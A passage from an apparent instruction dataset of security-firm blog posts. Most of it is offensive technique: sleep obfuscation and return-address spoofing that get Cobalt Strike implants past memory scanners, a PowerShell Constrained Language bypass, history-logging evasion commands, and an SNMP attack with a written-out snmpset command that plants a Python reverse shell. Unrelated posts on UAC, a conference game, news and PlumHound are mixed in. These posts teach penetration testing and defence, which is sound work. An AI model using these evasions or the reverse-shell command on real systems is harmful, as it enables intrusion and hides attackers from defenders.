a new context as the single argument and modifies the current thread to use this context. A context structure specifies values for CPU registers, including the instruction pointer, so it can redirect execution to a specified address. FOLIAGE queues a series of APCs which execute NtContinue to switch contexts repeatedly. A new context structure is used for each of the following steps in a chain that obfuscates the implant:\n\nWaits on a new event to keep the thread from exiting\n\nChanges the implant memory to be non-executable\n\nInstructs the KsecDD driver to encrypt the implant memory\n\nSaves the context of the original thread\n\nSets the context of the original thread to a fake context (more on this later)\n\nSleeps for the specified time with NtDelayExecution\n\nInstructs the KsecDD driver to decrypt the implant memory\n\nRestores the original thread context\n\nChanges the implant memory to be executable\n\nExits the new thread\n\nThis process can be further examined by reviewing lines 217-512 of sleep.c in FOLIAGE.\n\nA couple of months ago, C5pider claimed to have reversed MDSec NightHawk to create Ekko: an alternative to FOLIAGE which uses CreateTimerQueueTimer instead of NtQueueApcThread to queue calls to NtContinue.\n\nThe following demonstration uses FOLIAGE to bypass Moneta and PE-sieve.\n\nAvoiding Moneta and PE-sieve\n\nNtContinue is not the only API call that forcefully changes execution with context structures. It conveniently requires only one argument, but there are also viable alternatives.\n\nAvoiding Sleep\n\nTools like BeaconHunter and Hunt-Sleeping-Beacons alert on threads with a wait reason of \"DelayExecution\". This detection can be easily evaded using an alternative method of delaying execution which does not set this wait reason. WaitForSingleObject is an API that fits this requirement and sets a wait reason of \"UserRequest\". The following demonstration replaces the Sleep API call with WaitForSingleObject to bypass these tools.\n\nAvoiding Hunt-Sleeping-Beacons\n\nReturn Address Spoofing\n\nSpoofing the return address involves modifying the call stack return address, so it does not point to private commit memory. This section can be split into two distinct techniques: at rest, and execution return address spoofing.\n\nSpoofing at Rest\n\nThe term \"at rest\" refers to the implant during sleep. Most of the techniques discussed so far focus on this time as well. Commercial security products do not appear to be scanning the thread call stacks at rest, but open-source scanners such as PE-sieve will check return addresses when scanning.\n\nThis detection is partially evaded using a technique such as ThreadStackSpoofer. This PoC hides the return address by overwriting it with zero, effectively truncating the stack. Then, depending on the state of the stack, this technique may leak arguments onto the stack. These arguments may resemble memory addresses to create an indicator for scanners that inspect return addresses.\n\nA more stable technique is demonstrated in FOLIAGE. The author uses NtSetContextThread to overwrite the original thread's context with a manufactured context that sets the desired return address. The usage of NtSetContextThread is relatively rare and may be a point of detection. The author had not observed open-source scanners or commercial security products raising alerts on this behavior at the time of release.\n\nSpoofing at Execution\n\nThe other time a thread's call stack may be captured is \"at execution\". This is demonstrated most clearly in MalMemDetect, as described above. Our return address must point to image commit memory when we make hooked API calls to evade tools like this.\n\nThe x64 Return Address Spoofing PoC accomplishes this nicely. A ROP gadget from a loaded DLL is stored as the return address before the API call is made, which jumps to a stub that restores the context necessary to continue execution.\n\nAvoiding MalMemDetect\n\nSince the release of AceLdr, Hunt-Sleeping-Beacons has been updated to detect FOLIAGE. The scanner will now check all threads with a wait reason of \"UserRequest\" which also have a return address to KiUserApcDispatcher somewhere on their call stack. This cannot be easily bypassed with the public implementation of FOLIAGE as it requires call stack spoofing of API calls in the sleep chain at execution. Since FOLIAGE is obfuscating the shellcode used for return address spoofing, it cannot be called by the APC thread to spoof return addresses.\n\nAceLdr\n\nAs a part of this research, I released an implementation of the previously discussed techniques called AceLdr. This tool is a user-defined reflective loader (UDRL) for Cobalt Strike with the following features at the time of release:\n\nBypasses every referenced scanner\n\nEasy to use \u2013 import a single CNA script\n\nEncryption using SystemFunction032\n\nDynamic memory encryption using a secondary heap\n\nCode obfuscation and encryption using FOLIAGE\n\nDelayed execution using WaitForSingleObject\n\nReturn address spoofing at execution for InternetConnectA, NtWaitForSingleObject, and RtlAllocateHeap\n\nBlack Hills Information Security used this tool for approximately one year before releasing it publicly. Below is a demonstration of AceLdr bypassing several memory scanners.\n\nAvoiding Memory Scanners with AceLdr\n\nClosing Thoughts\n\nWhile AceLdr is made explicitly for Cobalt Strike, the techniques demonstrated in this post can be easily ported to many other projects. Each method presented here bypasses existing scanners. However, this does not guarantee they will evade future implementations, as we\u2019ve already seen with Hunt-Sleeping-Beacons.\n\nMemory scanners and commercial security products are not the same, but they share many characteristics. For example, evading open-source scanners does not guarantee security product evasion. In addition, security product evasion often does not require a complete memory scanner bypass since system resources and development costs limit vendors.\n\nCredits\n\nhttps://github.com/SecIdiot/FOLIAGE\n\nhttps://www.unknowncheats.me/forum/anti-cheat-bypass/268039-x64-return-address-spoofing-source-explanation.html\n\nhttps://github.com/waldo-irc/YouMayPasser\n\nhttps://github.com/Cracked5pider/Ekko\n\nhttps://github.com/waldo-irc/MalMemDetect\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Constrained Language Mode Bypass When __PSLockDownPolicy Is Used\"\nTaxonomies: \"Blue Team, General InfoSec Tips & Tricks, Informational, InfoSec 101, Red Team, Carrie Roberts, PowerShell\"\nCreation Date: \"Tue, 27 Sep 2022 15:30:59 +0000\"\nCarrie Roberts //\n\nPowerShell\u2019s Constrained Language (CLM) mode limits the functionality available to users to reduce the attack surface. It is meant to be used in conjunction with application control solutions like Device Guard User Mode Code Integrity. If CLM is enabled without proper application control settings, it is not an effective security solution.\n\nOne method for enabling CLM the wrong way is using the __PSLockDownPolicy environment variable. This is what Microsoft has to say about that:\n\nAs part of the implementation of Constrained Language, PowerShell included an environment variable for debugging and unit testing called __PSLockdownPolicy. While we have never documented this, some have discovered it and described this as an enforcement mechanism. This is unwise because an attacker can easily change the environment variable to remove this enforcement. In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.\nreference\n\nA malicious user with admin privileges could simply remove the environment variable, but what about a user without admins privs? At the end of the quote above, there is a very intriguing statement.\n\nIn addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.\n\nThere are file naming conventions to enable Full Language mode? Do tell \u2014 inquiring minds want to know!\n\nI\u2019m preparing a 16-hour course on \u201cPowerShell For InfoSec\u201d where I will be covering this topic, and I didn\u2019t feel comfortable making such a statement without actually knowing how to do it. So I put Google Search through the paces trying to find the magic file naming convention with no luck. Ultimately, I bit the bullet and actually looked at the PowerShell source code and now I share the magic with you. reference\n\nAnd there we have it. We just need to have \u201cSystem32\u201d somewhere in the path of the PowerShell script that we want to run in Full Language mode and it will do it. Let\u2019s test it out. First, from an administrative PowerShell prompt, enable CLM using the environment variable (aka \u201cthe wrong way).\n\n[Environment]::SetEnvironmentVariable(\u2018__PSLockdownPolicy\u2018, \u20184\u2019, \u2018Machine\u2018)\n\nNow, we will use this super simple script just to print out the current language mode.\n\nLet\u2019s run the script first from a path that does not contain \u201cSystem32\u201d and then again from a path that does.\n\nAnd there you have it; we can easily run any script in full language mode in this case, even without administrative access.\n\nKeep this trick in mind the next time you run into CLM on a pentest to help ensure the organization has implemented it correctly.\n\nIf you are interested in learning more about PowerShell topics such as \u2018Just Enough Admin\u2019, PowerShell remoting, language modes, and more, check out my 16-hour course called \u201cPowerShell For InfoSec\u201d here.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Why You Really Need to Stop Disabling UAC\"\nTaxonomies: \"Author, Blue Team, Noah Heckman, Administration, UAC, Windows\"\nCreation Date: \"Wed, 28 Sep 2022 20:18:50 +0000\"\nNoah Heckman // \n\nWindows Vista didn\u2019t have many fans in the Windows community (to put it lightly). It beaconed in a new user interface, file structure, and a bunch of darn popups asking if you really want to execute the software you just told it to execute.\n\nMany sysadmins have found this annoying, but even more annoying was all the end users calling to tell them about how annoying it was. There was a simple solution: just disable it.\n\nOver time, some went back and turned it on, while others did not \u2014 instead letting the GPO's disabling UAC remain in their active directory to this day. However, for those who turned it back on, they were once again reminded about how annoying it was and how many issues it caused. This was, of course, a double-edged sword, as UAC was also annoying to our adversaries.\n\nSo what does UAC do? UAC starts its work as soon as you log in. It checks if your account is an admin on the system, and if it is, then the UAC subroutine effectively splits the account into a high privilege and low privilege account. It locks admin operations behind an admin token, which then will prompt you for approval when you go to perform high privilege processes as you see below.\n\nThis is known as Admin Approval mode and does not require the user to input the password. In my opinion, this window should say \u201cWARNING! This process is trying to perform admin actions. Do you expect this for this application?\u201d because that is what it means when it interrupts your important spreadsheet session. If you are performing a process that only requires low privilege activities and you see this, you should stop right now! \n\nA common question that has been asked about admin approval mode is \u201cHow is this safe? Can\u2019t the process just hit yes for the user and execute the payload?\u201d Not exactly; both the normal UAC and the admin approval UAC prompt are supposed to come up in the Windows Secured Desktop Environment. When this happens, only certain processes can interact with it. Specifically, the logged-in user's explorer.exe process. So, in general, no, there is not a way for the malware to just \u201cclick yes.\u201d Of course, there is a slew of UAC bypass attacks that attempt to subvert these protections, so it is not infallible, but it does dramatically increase the security posture of the system versus having it disabled.\n\nIf that is not enough of a reason to make sure you have it enabled, then how about macros? UAC protects a computer from malicious macros more than you think. Of course, it will go off as described above if the macro tries to access or modify sensitive system objects, but what many don\u2019t know is that when you disable UAC, you also disable Mark of The Web (MoTW). MoTW is used to flag files that have been downloaded to your computer from untrusted locations, such as downloaded from the internet or sent as an email attachment. Office applications and other Windows processes look for this \u201cmark\u201d and will restrict certain actions based on it until you approve it.\n\nThis is why when you open an Excel document with macros on the internal share, it doesn\u2019t prompt you to \u201cenable editing\u201d and exit Microsoft Office\u2019s Protected Viewer. If your security team is pushing out the GPO settings to \u201cBlock Macros in Files Downloaded from the Internet,\u201d this also relies on MoTW. Therefore, if UAC is disabled, the document will not have the MoTW attribute and will sometimes run the macro without prompting, which makes phishing your end users a walk in the park. Another notable feature related to MoTW is the Windows Smart Screen, which is in place to prevent the execution of untrusted code. SmartScreen operates around many of the same principles above by prompting the user on the Secure desktop, asking if they really want to execute the untrusted program. Again, this can help with preventing many initial compromise attacks.\n\nAs defenders, we not only need to ensure that these protections are active but that we are using them to our advantage. Disabling macros from documents downloaded from the internet is a great start. Ensure Windows SmartScreen is enabled on the system. For bonus points, consider preventing your end users from being able to bypass it with the \u201crun anyway\u201d button. This will harden your systems, making it even harder for attacks to gain a foothold. All of these settings can be managed by GPO or Intune policy and pushed to the environment with minimal impact. The foundation of a security program is built on good communication. So, should you get complaints from your IT staff, developers, or end-users, please take a moment to explain the underlying process. In their eyes, UAC is nothing but an annoyance, and the standard \u201cbecause security said so\u201d response is not going to convince them otherwise. We are all busy but taking the time now to educate our people helps to prevent misinformed configurations like the ones that prompted this article from being made in the future.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"POGS at Wild West Hackin Fest!\"\nTaxonomies: \"Fun & Games, WWHF: Deadwood 2022\"\nCreation Date: \"Wed, 12 Oct 2022 21:19:24 +0000\"\nEan Meyer //\n\nThis post is for attendees of Wild West Hackin' Fest: Deadwood 2022\n\nPOGs? Yes, POGs! If you aren\u2019t familiar with POGs, this game started decades ago, reaching the peak of its popularity in the 1990s. The game is simple: players have stacks of cardboard discs with logos, memes, and other graphic (\u201cPOGs\u201d) that they place face down, as well as a \u201cslammer.\u201d To start, two players contribute an equal number of POGS from their collection to create a combined stack of 10-14 POGs. They then take turns throwing their slammer at the stack. The POGs explode up when hit. The ones that land face up are kept by the player that threw the slammer. The game continues until the players decide they are done or they run out of POGs to play with.  \n\nWant to know more about POGs? Check this out - https://www.youtube.com/watch?v=RTOmg9y8yv4  \n\nWant to know how to play? Watch this - https://youtu.be/smobVX9MdWY \n\nYou might be wondering what this has to do with a security conference. It has nothing to do with security and everything to do with helping people meet each other and create new relationships. At WWHF Deadwood 2022, attendees will have opportunities to play POGs, meet others, network, and win amazing prizes! \n\nEach attendee will get a starter pack of POGs with the logos of our fantastic sponsors and a slammer so you can start playing immediately\u2026 and you will want to play when you hear what you can win.  \n\nAt Sponsor Stampede  \n\nAt the Sponsor Stampede on Wednesday night at 6:00pm, you will be able to meet with sponsors at seven locations where they will have rare POGs to collect and play with. The Sponsor Stampede will end back at the Deadwood Mountain Grand. There you have multiple ways to win prizes.  \n\nShow the registration desk you\u2019ve collected all the rare POGs and you will get a ticket to win in our prize drawing that evening.  Members of the Content & Community Team will be wandering the hall looking for people playing POGs. Every time they spot you playing POGs with a new person, you can get another ticket to win.  \n\nWhat can you win? Great question, glad you asked! Winners of the Sponsor Stampede POG game will get a Back to the Future Flux Capacitor for their desk AND a ticket to next year's Wild West Hackin\u2019 Fest. \n\nRare Drops \n\nDuring the conference, more Rare POGs may be dropped with specific sponsors. Listen for announcements from MCs for Rare Drops and where to get them! \n\nPOG Rustling Champion \n\nDon\u2019t stop playing after the Stampede! At the end of the conference, a POG Rustling Champion will be announced! Play POGs with attendees to win their POGs. Stop by the registration desk before 4pm and count out your POGs. We will write down your name, how many POGs you have, and the person with the most POGs will be declared the WWHF:Deadwood 2022 POG Rustling Champion. The POG Rustling Champion will receive: \n\nA trophy A Back to the Future Lego Delorean kit valued at $200 A trip to WWHF: Deadwood 2023 including badge, hotel, and airfare (valued up to $1500!) \n\nSo play POGs and win prizes but more importantly, make new friends and connections with people. We want you to have fun and build relationships that last well beyond the con! \n\nGet your slammer out and get those POGs! We hope you have a blast! Let us know what you think; we definitely want your feedback.  \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Talkin About Infosec News - 10/17/2022\"\nTaxonomies: \"Informational\"\nCreation Date: \"Tue, 18 Oct 2022 18:37:09 +0000\"\n\nhttps://youtu.be/z1bpUHK-4wA\n\n00:00 - PreShow Banter\u2122 \u2014 Dumpster Fire Friends03:07 - PreShow Banter\u2122 \u2014 WHHF Deadwood - https://wildwesthackinfest.com/deadwood/\n\n03:48 - BHIS - Talkin\u2019 Bout [infosec] News 2022-10-0307:37 - Story # 1: High-severity Microsoft Exchange 0-day under attack threatens 220,000 servershttps://arstechnica.com/information-technology/2022/09/high-severity-microsoft-exchange-0-day-under-attack-threatens-220000-servers/19:30 - Story # 2: Stealthy hackers target military and weapons contractors in recent attackhttps://www.bleepingcomputer.com/news/security/stealthy-hackers-target-military-and-weapons-contractors-in-recent-attack/25:52 - Story # 3: Putin grants Russian citizenship to Edward Snowdenhttps://www.npr.org/2022/09/26/1125109303/putin-edward-snowden-russian-citizenship29:09 - Story # 4: What the Securing Open Source Software Act does and what it misseshttps://www.zdnet.com/article/whats-what-in-the-united-states-securing-open-source-software-act/38:17 - Story # 4b: SecBSD Teamhttps://secbsd.org/team.html40:43 - Story # 5: New Malware Campaign Targeting Job Seekers with Cobalt Strike Beaconshttps://thehackernews.com/2022/09/new-malware-campaign-targeting-job.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"New PowerShell History Defense Evasion Technique\"\nTaxonomies: \"Blue Team, Carrie Roberts, General InfoSec Tips & Tricks, Informational, InfoSec 101, Recon, Red Team\"\nCreation Date: \"Tue, 29 Nov 2022 16:15:11 +0000\"\nCarrie Roberts //\n\nPowerShell incorporates the handy feature of writing commands executed to a file to make them easy to refer back to later. This functionality is provided by the PSReadline module. This feature is helpful from a usability perspective but can be a tool that hackers use against you.\n\nFor example, if sensitive information like passwords are entered into the PowerShell command line, they will also be added to the history file and a hacker can review this history to discover that sensitive information.\n\nIn an effort to solve this issue, the PSReadline module version v2.0.4+ will skip adding a command line to the history file if it contains sensitive words like (more info here):\n\nPassword\n\nAsplaintext\n\nToken\n\nApikey\n\nSecret\n\nPowerShell v7.0.11+ ships with a PSReadline version that supports this feature out-of-the-box, but Windows PowerShell version 5.1 ships with PSReadline version 2.0.0 and doesn\u2019t support this feature, however it can easily be updated.\n\nLet\u2019s see the sensitive history scrubbing in action.\n\nIn the image above, we ran three commands, one of which contained one of the words that trigger the \u201csensitive\u201d filter. Notice that the password line is not listed when we \u201ccat\u201d (aka print to screen) the history file.\n\nThis is kind of nifty, but it also makes for a really easy defense evasion technique where a hacker can control which of their commands show up in the history file.\n\nIn the image above, we were able to keep the second command from being recorded in the history file by simply adding a comment containing one of the \u201csensitive\u201d words.\n\nThis really isn\u2019t an earth-shattering discovery because attackers have always been able to open the history file and individually remove commands from it if they wanted to. Nevertheless, this does make this defense evasion tactic even easier and is a trick that I would use on my next red teaming engagement.\n\nAnother interesting option for defense evasion is to define your own code for deciding whether a command is written to the history file. We could disable all history logging for the current session as follows:\n\nSet-PSReadLineOption -AddToHistoryHandler { return $false }\n\nThe \u201cAddToHistoryHandler\u201d receives the current command as the $line variable and then returns $true if the line should be written to the history file. Here we simply return $false so nothing gets added to the history file for the current session. On the defensive side, we could keep an eye out for any funny business when the AddToHistoryHandler parameter is used. In fact, keeping an eye on the use of all the PSReadLineOption functions would probably be a good idea. Here are a few more examples of defense evasion.\n\nPrevent logging: Set-PSReadlineOption -HistorySaveStyle SaveNothing\n\nDelete history file: Remove-Item (Get-PSReadlineOption).HistorySavePath\n\nSet alternate file path: Set-PSReadLineOption -HistorySavePath $env:TEMP\\out.txt\n\nUse ContrainedLanguage mode: $ExecutionContext.SessionState.LanguageMode = \"ConstrainedLanguage\"\n\nIf you are interested in learning more about PowerShell topics such as \u2018Just Enough Admin\u2019, PowerShell remoting, language modes and more, check out my 16-hour course called \u201cPowerShell For InfoSec\u201d here.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"PlumHound Reporting Engine for BloodHoundAD\"\nTaxonomies: \"Author, Blue Team, Informational, Kent Ickler, Active Directory, bloodhound, BloodHoundAD, Control Paths, Domains, PlumHound, Purple Team, reports, System Administration\"\nCreation Date: \"Tue, 06 Dec 2022 17:05:22 +0000\"\nKent Ickler // \n\nIt\u2019s been over two years since Jordan and I talked about a Blue Team\u2019s perspective on Red Team tools.  \n\nA Blue Team's Perspective on Red Team Hack Tools - YouTube \n\nThe webcast itself had interesting topics; at the end of the discussion, we talked about a tool we wrote. PlumHound is a report engine for BloodHoundAD to make actionable reports for Blue Teams, Systems Administrators, and Analysts. We figured it\u2019s about time we got around to writing this blog. \n\nThe framework for PlumHound is relatively simple: utilize the control path-finding capabilities of BloodHoundAD in Neo4j to build actionable intelligence for blue teams to identify Active Directory problems.   \n\nA while into development, we ran into Mathieu Saulnier (Scoubi) who had a similar project. Finding similar objectives, we merged our efforts. Mathieu brought in additional modules that would identify the weakest link (AnalyzePath) to a control path vulnerability and the most important paths to remediate first (BusiestPath) to be most effective\u2014 both modules of his BlueHound project.\n\nOn pentests where we found interesting control path vulnerabilities, we took a few moments to analyze the condition and, if it was something new, write a new PlumHound report using Neo4j cyphers. Meanwhile, other information security teams began to use the report engine to build their own reports as well. \n\nToday, we have 69 PlumHound reports in the packaged \u201cDefault\u201d reports, plus the Busiest Path and Analyze Path functions of Mathieu Saulnier\u2019s BlueHound. \n\nSo, how does it all work?\n\nFirst off, we have to acknowledge that we stand on the shoulders of the giants that built Neo4j, BloodHoundAD, and its data collectors. With that said, PlumHound uses Python to connect to the Neo4j database after BloodHoundAD has ingested and parsed data. PlumHound then uses Neo4j\u2019s cypher language to query its database for information and output that information into CSV or HTML reports (or, alternatively, to standard output). That is, the BloodHoundAD analysis can be normalized into a reporting format that can be consumed for data-driven decision making about correcting common Active Directory control path vulnerabilities. \n\nRunning PlumHound Report Engine \n\nRunning PlumHound is easy: specify the Neo4j database connection and specify the \u201ctask-list\u201d you want to do. Task-lists are sets of cypher queries and metadata that tell PlumHound what query to run and how to generate a report from the output. The \u201cDefault\u201d task-list included with PlumHound includes 69 reports plus an index. \n\nTo shorthand things even further, if your Neo4j server is on localhost, you won\u2019t need to specify a Neo4j connection.  \n\nFor versions of Neo4j that still use \u201cdefault\u201d credentials, you must first update the default credentials to use the service. If you\u2019re like me, you source-filter the Neo4j service and update credentials to be something\u2026 easy\u2026 lazy\u2026 terrible?  Anyway, I change the password from \u201cneo4j\u201d to \u201cneo4jj\u201d because source-filter the service. Remember, if you source-filtered the service, you will need to run PlumHound from that trusted source. \n\n If your username is \u201cneo4j\u201d and your updated password is \u201cneo4jj\u201d, you won\u2019t need to specify your username and password to connect to the Neo4j database, because the default is \u201cneo4jj\u201d. \n\nIt\u2019s as simple as:\n\nThat will execute the default included task-list.   \n\nPlumHound.py -x tasks/default.tasks \n\nThat\u2019s it, 69 PlumHound reports + a report index are ready for your review, nice! \n\nTask Files \n\nThe TaskList files allow PlumHound to be fully scripted with batch jobs after the SharpHound dataset has been imported not BloodHoundAD on Neo4j. The TaskList file syntax is as follows. (Note that any cypher query containing a double quote must be modified to use a single quote instead of double.)\n\n[\"Report Title\",\"[Output-Format]\",\"[Output-File]\",\"[CypherQuery]\"] \n\nWhat reports are packaged in the default list?   \n\nThe \u201cdefault.tasks\u201d instructs PlumHound to also generate an index of all the produced reports, index.html.   \n\nOpening the index.html file shows us the list of reports. The reports start out pretty typical and provide a general report-based picture of the Active Directory environment.  \n\nThen, our first interesting set of reports. Our test database we used isn\u2019t super interesting, but each of the reports below provide information that, as penetration testers, we use to find a foothold or escalate privileges on the network. Of course, as a Blue Teamer, we\u2019d recommend thinking critically about each of the items in these reports.  \n\nNext up, reports that tell us if common or overly-used groups have been potentially mistakenly provided Active Directory delegation. In the group below, PasswordResetter groups let us know that a group has been delegated to reset passwords and will count how many users are delegated to the group.\n\nNext up, reports regarding the domain\u2019s GPOs and analysis of the GPO owners. Then RDP groups that tell us if RDP access is provisioned via groups and which groups provide access to a count of systems. \n\nThen, reports of Kerberoastable users with the most privileges and an analysis of Local Administrators.\n\nAnd onto reports about Computer Objects, Operating Systems, and LAPS Deployments. \n\nAfter computers, we look at user accounts. We report all identified user sessions and users with multiple sessions on different systems. We then look at user accounts with old passwords. We look at users with vulnerable \u201cuserpassword\u201d attributes and users with no Kerberos pre-authentication needed. We also have reports of users with administrative control of a system both directly and indirectly. Users with \u201cAdd To Group Delegation\u201d tell us which users have been delegated to change group membership \u2013 both directly and indirectly. We report on users that have never logged in, and finally, users that are never required to change their passwords. \n\nFinally, we have reports that are populated by the user of BloodHoundAD\u2019s \u201cOwned\u201d flags, allowing an analyst to produce detailed reports of post-exploitation, defining exactly which user and computer accounts were compromised during an engagement.  \n\nCyphers Included \n\nEach of the produced reports includes the cypher query used to generate the report. While useful for troubleshooting and developing the reports, it also allows the analyst the ability to utilize the cypher query as an ingest to other tooling.   \n\nIn the below report, \"GPO Creators Owners\u201d, we see that ASADMIN@ASAZLAB.com is a GPO Creator/Owner. Included in the report are the date and time the report was executed, as well as the cypher query used to generate the report. \n\nHow do analysts use these reports?  \n\nA penetration tester can find quick information \u2013 for example: what user accounts don\u2019t require a password change but have also ever been an admin? The \u201cUser Password Never Expires Exception\u201d report will tell us just that by checking the \u201cAdminCount\u201d column. \n\nA defensive or Blue Team analyst can also use the same reports but with the objective of identifying vulnerable configurations to be remedied. \n\nSingle Queries\n\nPlumHound\u2019s interface with Neo4j also means that you can quickly and easily execute cypher queries and output directly to the console. In the below example, we query for users that never require a password change. \n\n./PlumHound.py -q \"MATCH (n:User) WHERE n.pwdneverexpires RETURN n.name as Name,n.displayname as DisplayName,n.enabled as Enabled, n.title as Title, n.pwdneverexpires as PWDNeverExpires, n.passwordnotreqd as PWDNotReqd, n.admincount as AdminCount\" \n\nEven more task-lists\n\nPlumHound also includes other task-lists that are more specific to looking for specific data. For example, we\u2019ve bundled Kerberoasting specific reports into its own task-list.  We\u2019ve produced a task-list to generate CSV reports instead of HTML. We also have a task-list that will hunt for interesting things, such as passwords in description, or comment attributes of Active Directory objects. \n\nAnalyze Path (BlueHound Module) \n\nThe Analyze path function allows us to identify what relationship to break to stop a control path vulnerability. The command syntax is simple: use flag -ap and specify either user, group, computer, ou, or GPO as a start to the path analysis. \n\n./PlumHound.py -ap user \n\nIn the below screenshot, user DataAnalyst@asazlab.com has a path to OU \u201cAdminAccounts\u201d. The output below details the path.\n\nFor those more familiar with BloodHound\u2019s GUI, this is the same representation as below, but indicating the specific relationships to break.\n\nThe AnalyzePath query will effectively produce a kill-chain for every vulnerable path by user, group, computer, OU, or group. \n\nBusiest Path (BlueHound Module) \n\nThe Busiest Path finds the shortest (or all) paths that give the most users a path to Domain Admin and gives us number of affected users. The most \u201cbusiest path\u201d is listed first. This informs a team tasked with remediating path vulnerabilities information about which paths to start remediating first to most effectively use their time and effort. \n\nIn the case below, we search for the top 5 most user-affected shortest paths to Domain Admin.  \n\n./PlumHound.py -bp short 5 \n\n The first path described below affects six users and is a path starting from group USR_Helpdesk@asazlab.com to Domain Admins \n\nWe can see the path in BloodHoundAD by using the control-paths search:  \n\nVerbosity As a Feature? \n\nThis tool was made by someone who doesn\u2019t write code for a living, or at least not full-time. As a clutch for not writing in a debug IDE, I\u2019ve written in a function that causes the PlumHound tool to have a very configurable debug verbosity. This helps the process of testing cypher queries and writing task lists.   \n\nThe verbosity argument for PlumHound is -v (number). The verbose number can be 0-1000, where \u201c0\u201d is quiet and 1000 produces a message on every crucial step of the PlumHound process, somewhere in between is just that. Too verbose? Reduce your -v setting. Not enough?  Increase it. In addition to this, verbose logging is also configured to review prior logs generated by the tool. \n\nCheck out PlumHound for Yourself \n\nWe invite you to checkout the PlumHound report engine. We\u2019ve built it open-source to help administrators and analysts make the most of BloodHoundAD\u2019s control path analysis. \n\n If you find a useful cypher query you want added, let us know, or make a pull request. \n\nGitHub Link: PlumHound (github.com) \n\nDocumentation: PlumHound | Bloodhound for Blue and Purple Teams \n\nInterested in knowing more about securing Active Directory and Enterprise environments? Check out our class presented by AntiSyphon Security, Defending the Enterprise. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"SNMP Strings Attached!\"\nTaxonomies: \"Author, Dale Hobbs, External/Internal, How-To, Informational, InfoSec 201, Recon, Community Strings, Default, SNMP\"\nCreation Date: \"Wed, 21 Dec 2022 15:08:47 +0000\"\nDale Hobbs //\n\nOne thing that I almost always find when performing an internal network penetration test is Simple Network Management Protocol (SNMP) configured with default community strings.\n\nSimple Network Management Protocol (SNMP) is a widely-used protocol for managing and monitoring network devices such as routers, switches, and servers. It allows network administrators to manage and monitor the performance of network devices and to troubleshoot issues when they arise.\n\nSNMP is based on a \"manager-agent\" model, where a central network management system (NMS) acts as the manager and communicates with SNMP agents on each network device. The NMS sends requests to the agents for information about the device, and the agents respond with the requested data. This allows the NMS to collect and analyze data from all the devices on the network.\n\nSNMP depends on secure strings (or \u201ccommunity strings\u201d) that grant access to portions of a device's management planes. There are two common community strings that we often see \u2014 \u2018public\u2019 which mainly provides read-only access and \u2018private\u2019 which generally provides read-write access.\n\nA device that uses default SNMP community strings can have its entire configuration read using SNMP queries. In addition, when a device is configured with SNMP write access using a default string such as \u2018public\u2019, it is trivial for an attacker to modify the device\u2019s configuration.\n\nThere are 3 versions of SNMP:\n\nSNMPv1: This is the oldest version whereby the authentication is based on a community string that is transmitted without the benefit of encryption and as such, all the information is transmitted in plain text as well. It\u2019s easy to set up but is only protected by the plain text community string.\n\nSNMPv2c: Version 2c is nearly identical to Version 1 except it adds support for 64-bit counters. This is by far the most frequently used version today but like Version 1, also sends the traffic in plain text as well uses a plain text community string as authentication. Even if you have a non-default community string, gaining a Machine in the Middle position will result in disclosure of the community string through simple packet analysis.\n\nSNMPv3: Version 3 is the latest version of SNMP and adds both encryption and authentication which can either be used together or separately. It\u2019s more complex to set up than Version 1 or Version 2c but is a much more secure choice.\n\nLet\u2019s look at what types of information we can gather from a device. Nmap has a handful of useful NSE scripts specifically for SNMP. For example, using the \u2018snmp-sysdescr\u2019 NSE script, we can retrieve the server type and operating system.\n\nUsing the \u2018snmp-interfaces\u2019 NSE script, we can gather some network information about the device, such as IP addresses, any additional network interfaces, and even traffic statistics.\n\nWhile these are all useful for a network administrator, they\u2019re also useful for an attacker, as they can start to build a profile about the system and attempt to formulate an attack.\n\nWhile this is by no means an exhaustive list of what you can do with SNMP, it should at least give you an idea of what we can gather using SNMP. If you\u2019d like to see more SNMP scripts, you can consult https://nmap.org.\n\nSo now that we\u2019ve seen a couple things you can do with SNMP from a blue team perspective, let\u2019s see what we can do as an attacker using SNMP when configured with default community strings. For the purposes of this article, we\u2019re going to be attacking a Linux-based system configured with SNMP in hopes of gaining a remote shell.\n\nFirst off, by doing a simple Nmap UDP scan of the system ,we can see that SNMP is indeed running on the system and is using the default UDP port 161.\n\nNow that we have confirmed that the system is running SNMP, we can use Metasploit\u2019s \u2018scanner/snmp/snmp_login\u2019 module to see if the system is utilizing the default community strings.\n\nAs can be seen from the output above, the system is in fact using both the 'public' (read-only) and 'private' (read-write) community strings. Because we have read-write access using the \u2018private\u2019 string, we are now able to add or execute additional commands on the system over SNMP by appending additional rows to the \u2018nsExtendObjects\u2019 table.\n\nThe \u2018nsExtendObjects\u2019 is part of the NET-SNMP-EXTEND-MIB extension for the Net-SNMP agent that allows you to query arbitrary shell scripts. A deep dive on this is outside of the scope of this article but if you\u2019d like to learn more about it, you can find a detailed article here.\n\nUsing the following command, we can inject a command into the SNMP configuration that will create a reverse shell back to our attacker system.\n\nsnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private 192.168.19.128 \\ \n 'nsExtendStatus.\"evil\"' = createAndGo \\\n 'nsExtendCommand.\"evil\"' = /usr/bin/python \\\n 'nsExtendArgs.\"evil\"' = '-c \"import \n sys,socket,os,pty;s=socket.socket();s.connect((\\\"192.168.19.50\\\",1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"/bin/sh\\\")\"'\n\nNext, we launch a Netcat listener on our attacker system.\n\nWith our Netcat listener waiting, we now use snmpwalk to trigger the command execution on the victim and initiate a connection to the Netcat listener on our attacker system.\n\nWe can safely ignore the timeout message as we can now see in our Netcat listener that we have a new connection from our victim system. And to add insult to injury, not only do we have a remote shell to our victim system, we can see that we also have root access to the system.\n\nThis type of attack can be extended to network infrastructure devices like routers, switches, and other appliances. Imagine the implications of an attacker modifying access control lists, altering VLAN configurations, or simply disabling ports on a network infrastructure device. Read-write access can be used to bypass security controls, move laterally on the network, or cause denial of service events.\n\nNow that we\u2019ve seen how SNMP can be abused, let\u2019s look at some best practices for securing 